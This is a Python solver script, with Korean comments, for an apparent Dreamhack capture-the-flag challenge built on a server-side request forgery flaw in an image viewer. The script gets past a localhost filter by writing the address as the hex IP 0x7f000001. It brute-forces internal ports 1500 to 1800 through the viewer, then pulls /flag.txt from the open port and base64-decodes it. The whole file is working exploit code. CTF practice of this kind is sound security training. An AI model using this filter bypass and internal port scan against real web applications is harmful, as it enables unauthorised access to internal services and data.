# request를 사용
import requests
from bs4 import BeautifulSoup as bs
from tqdm import tqdm   # 진행률 프로세스바
import base64

# not found src ???
NOTFOUND_IMG = "iVBORw0KG"  # base64로 치환하면 이 문자열로 시작함

def send_img(img_url) :
    global chall_url

    data = {
        "url" : img_url
    }
    response = requests.post(chall_url, data=data)  # img_viewr url로 post 요청    
    return response.text    # 응답확인

def find_port():
    for port in tqdm(range(1500, 1801)) :   # 지정되어있는 포트 범위에서 반복문 호출 
        img_url = f"http://0x7f000001:{port}"    # 내부서버 port 반복문으로 지정. localhost는 필터링이 걸려있으므로 우회접근

        if NOTFOUND_IMG not in send_img(img_url):   # 404 img가 아닌 실제 이미지가 왔으면 포트번호를 찾은거임
            print(f"Internal port number is : {port}")
            break
    
    return port

def check_answer(answer_port):
    data = {
        "url" : f"http://0x7f000001:{answer_port}/flag.txt"
    }

    # flag값 찾기
    response = requests.post(chall_url, data=data)  # img_viewr url로 post 요청    
    soup = bs(response.text, "html.parser") # img src 코드 추출
    img_src = soup.select("div.container > img")
    flag_encode = img_src[0]['src']    # 응답확인
    base64_str = flag_encode.split(" ")[1] # 추출하고자 하는 데이터만 가져오기.. 좋은 방법은 아니지만 split으로 구분했음
    flag_val = base64.b64decode(base64_str) # decode
    return flag_val    # 응답확인

if __name__=="__main__":
    chall_port = 9272    
    chall_url = f"http://host3.dreamhack.games:{chall_port}/img_viewer"

    internal_port = find_port()
    result = check_answer(internal_port)
    print(result)

    